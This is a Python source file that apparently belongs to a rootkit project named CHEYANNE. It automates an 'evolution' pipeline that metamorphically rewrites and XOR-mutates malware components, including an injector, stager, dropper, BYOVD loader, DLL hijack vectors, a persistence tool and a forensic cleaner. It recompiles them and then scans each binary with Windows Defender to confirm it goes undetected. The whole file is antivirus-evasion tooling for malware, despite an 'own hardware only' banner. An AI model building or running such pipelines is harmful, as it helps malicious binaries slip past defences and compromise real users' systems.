"""
CHEYANNE ROOTKIT — Evolution Pipeline (metamorph + mutate + compile + scan)
22DIV / george wu

Chains the full obfuscation pipeline in one command:
  1. metamorph.py — structural source transforms (dead code, opaque predicates, junk)
  2. mutate.py — XOR key rotation on the transformed source
  3. compile — recompile all mutated binaries
  4. scan — Defender verification on all outputs
  5. fingerprint — hash every binary for change tracking

Each run produces a unique binary identity. No two evolution cycles
produce the same output. The metamorphic layer changes structure,
the mutation layer changes keys, the compiler changes optimization.

Usage:
    python cheyanne_evolve.py                         # Full evolution, all components
    python cheyanne_evolve.py --target dark_room      # Single component
    python cheyanne_evolve.py --intensity high         # Maximum transform density
    python cheyanne_evolve.py --cycles 3              # Run 3 evolution cycles
    python cheyanne_evolve.py --dry-run               # Preview without changes
"""

import os
import sys
import subprocess
import hashlib
import glob
import shutil
from datetime import datetime

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        os.environ.setdefault("PYTHONIOENCODING", "utf-8")

ROOT = os.path.dirname(os.path.abspath(__file__))

MPCMDRUN = None
for p in sorted(glob.glob(r"C:\ProgramData\Microsoft\Windows Defender\Platform\*\MpCmdRun.exe"), reverse=True):
    MPCMDRUN = p
    break

BINARY_PATHS = {
    "dark_room.exe": os.path.join(ROOT, "dark_room", "dark_room.exe"),
    "vader_shell.exe": os.path.join(ROOT, "shell", "vader_shell.exe"),
    "vader_inject.dll": os.path.join(ROOT, "injection", "vader_inject.dll"),
    "vader_inject.exe": os.path.join(ROOT, "injection", "vader_inject.exe"),
    "WsNativePushService.exe": os.path.join(ROOT, "vectors", "v4_svc_replace", "WsNativePushService.exe"),
    "VERSION.dll": os.path.join(ROOT, "vectors", "v5_dll_proxy", "VERSION.dll"),
    "targetname.dll": os.path.join(ROOT, "vectors", "v6_path_hijack", "targetname.dll"),
    "osppc.dll": os.path.join(ROOT, "vectors", "v7_phantom_dll", "osppc.dll"),
    "http_stager.exe": os.path.join(ROOT, "stagers", "http_stager.exe"),
    "vader_clean.exe": os.path.join(ROOT, "forensics", "vader_clean.exe"),
    "cloak.dll": os.path.join(ROOT, "cloak", "bin", "cloak.dll"),
    "cloak_loader.exe": os.path.join(ROOT, "cloak", "bin", "cloak_loader.exe"),
    "vader_dropper.exe": os.path.join(ROOT, "cloak", "bin", "vader_dropper.exe"),
    "byovd.exe": os.path.join(ROOT, "byovd", "bin", "byovd.exe"),
    "vader_persist.exe": os.path.join(ROOT, "byovd", "bin", "vader_persist.exe"),
}


def log(msg, level="*"):
    print(f"  [{level}] {msg}")

def log_ok(msg):
    log(msg, "+")

def log_fail(msg):
    log(msg, "!")


def sha256_file(path):
    if not os.path.exists(path):
        return None
    try:
        h = hashlib.sha256()
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(65536), b""):
                h.update(chunk)
        return h.hexdigest()[:16]
    except OSError:
        return None


def scan_all_binaries():
    if not MPCMDRUN:
        log("No Defender scanner found")
        return {}

    results = {}
    for name, path in BINARY_PATHS.items():
        if not os.path.exists(path):
            results[name] = "NOT_FOUND"
            continue

        try:
            result = subprocess.run(
                [MPCMDRUN, "-Scan", "-ScanType", "3", "-File", path, "-DisableRemediation"],
                capture_output=True, text=True, timeout=30,
            )
            if result.returncode == 0:
                results[name] = "CLEAN"
            elif result.returncode == 2:
                results[name] = "DETECTED"
            else:
                results[name] = f"RC={result.returncode}"
        except subprocess.TimeoutExpired:
            results[name] = "TIMEOUT"

    return results


def run_phase(cmd, desc):
    log(f"Phase: {desc}")
    result = subprocess.run(
        cmd, shell=True, capture_output=True,
        timeout=300, cwd=ROOT,
    )
    stdout = result.stdout.decode("utf-8", errors="replace") if isinstance(result.stdout, bytes) else (result.stdout or "")
    stderr = result.stderr.decode("utf-8", errors="replace") if isinstance(result.stderr, bytes) else (result.stderr or "")
    output = stdout + stderr
    for line in output.strip().split('\n'):
        if line.strip():
            print(f"    {line}")
    return result.returncode == 0


def fingerprint_all():
    log("Binary fingerprints:")
    for name, path in sorted(BINARY_PATHS.items()):
        h = sha256_file(path)
        if h:
            try:
                size = os.path.getsize(path) // 1024
            except OSError:
                size = 0
            log(f"  {name:<28s} {h}  {size:>4d} KB")
        else:
            log(f"  {name:<28s} NOT BUILT")


def evolve(target=None, intensity="med", dry_run=False, cycles=1):
    print("=" * 60)
    print("  CHEYANNE ROOTKIT — Evolution Pipeline")
    print("  22DIV / george wu")
    print("  TARGET: Own hardware only")
    print("=" * 60)

    for cycle in range(1, cycles + 1):
        print(f"\n  {'=' * 56}")
        print(f"  CYCLE {cycle}/{cycles}")
        print(f"  {'=' * 56}")

        target_flag = f"--target {target}" if target else ""

        if dry_run:
            log("[dry-run] Would execute:")
            log(f"  1. metamorph.py {target_flag} --intensity {intensity}")
            log(f"  2. mutate.py {target_flag}")
            log(f"  3. Defender scan all binaries")
            log(f"  4. Fingerprint all binaries")
            continue

        log(f"Intensity: {intensity} | Cycle: {cycle}/{cycles}")
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")

        metamorph_cmd = f'python "{os.path.join(ROOT, "metamorph.py")}" {target_flag} --intensity {intensity}'
        ok1 = run_phase(metamorph_cmd, "METAMORPH — structural transforms")

        if not ok1:
            log_fail("Metamorph failed — aborting cycle")
            continue

        mutate_cmd = f'python "{os.path.join(ROOT, "mutate.py")}" {target_flag}'
        ok2 = run_phase(mutate_cmd, "MUTATE — XOR key rotation + compile")

        if not ok2:
            log_fail("Mutation failed — restoring backups")
            restore_cmd = f'python "{os.path.join(ROOT, "metamorph.py")}" --restore'
            run_phase(restore_cmd, "RESTORE — reverting to pre-metamorph state")
            continue

        log_ok(f"Cycle {cycle} complete — metamorph + mutate + compile")

    if not dry_run:
        print(f"\n  {'=' * 56}")
        print(f"  VERIFICATION")
        print(f"  {'=' * 56}")

        results = scan_all_binaries()
        clean = sum(1 for v in results.values() if v == "CLEAN")
        detected = sum(1 for v in results.values() if v == "DETECTED")
        not_found = sum(1 for v in results.values() if v == "NOT_FOUND")

        for name, status in sorted(results.items()):
            marker = "+" if status == "CLEAN" else "!" if status == "DETECTED" else "~"
            log(f"{name:<28s} {status}", marker)

        print(f"\n  CLEAN: {clean} | DETECTED: {detected} | NOT_FOUND: {not_found}")

        print(f"\n  {'=' * 56}")
        print(f"  FINGERPRINTS")
        print(f"  {'=' * 56}")
        fingerprint_all()

    print(f"\n  {'=' * 56}")
    print(f"  EVOLUTION COMPLETE")
    print(f"  {'=' * 56}")


def main():
    import argparse
    parser = argparse.ArgumentParser(description="CHEYANNE Evolution Pipeline")
    parser.add_argument("--target", type=str, help="Single component to evolve")
    parser.add_argument("--intensity", type=str, choices=["low", "med", "high"], default="med")
    parser.add_argument("--cycles", type=int, default=1, help="Number of evolution cycles")
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--scan-only", action="store_true", help="Just scan existing binaries")
    parser.add_argument("--fingerprint", action="store_true", help="Just fingerprint existing binaries")
    args = parser.parse_args()

    if args.scan_only:
        results = scan_all_binaries()
        for name, status in sorted(results.items()):
            marker = "+" if status == "CLEAN" else "!" if status == "DETECTED" else "~"
            log(f"{name:<28s} {status}", marker)
        return

    if args.fingerprint:
        fingerprint_all()
        return

    evolve(
        target=args.target,
        intensity=args.intensity,
        dry_run=args.dry_run,
        cycles=args.cycles,
    )


if __name__ == "__main__":
    main()
